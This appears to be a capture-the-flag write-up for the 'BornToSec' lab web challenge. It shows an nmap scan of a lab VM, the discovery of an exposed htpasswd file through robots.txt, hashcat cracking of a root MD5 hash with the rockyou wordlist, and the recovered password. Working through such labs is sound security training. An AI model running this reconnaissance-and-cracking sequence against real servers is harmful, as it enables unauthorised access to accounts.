# Htpasswd Based Authentication

An hpasswd file is a txt file that contains credentials of users (for authentication).
It could contains sensitive informations (encrypted or not).

<!-- Depends on network -->
nmap -v -A -T4 192.168.56.103

We find 2 directories:
```shell
	PORT   STATE SERVICE VERSION
	80/tcp open  http    nginx 1.4.6 (Ubuntu)
	|_http-favicon: Unknown favicon MD5: E7D08792AE6EC9DBBF3CEBFB48EE4057
	| http-methods:
	|_  Supported Methods: GET HEAD POST
	| http-robots.txt: 2 disallowed entries
	|_/whatever /.hidden
	|_http-server-header: nginx/1.4.6 (Ubuntu)
	|_http-title: BornToSec - Web Section
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
In whatever there is a htpasswd file that contain:
root:437394baff5aa33daa618be47b75cb49

It looks like MD5, we can try to bruteforce it with hashcat and rockyou:
```shell
hashcat -m 0 -a 0 hash /<PATH>/rockyou.txt --force
```
We find:
437394baff5aa33daa618be47b75cb49:qwerty123@
We can't connect to this in login page but there is an admin connect page

## External Resources

https://httpd.apache.org/docs/2.4/fr/programs/htpasswd.html
https://defendtheweb.net/discussion/1159-bypassing-htaccesshtpasswd-based-authentication
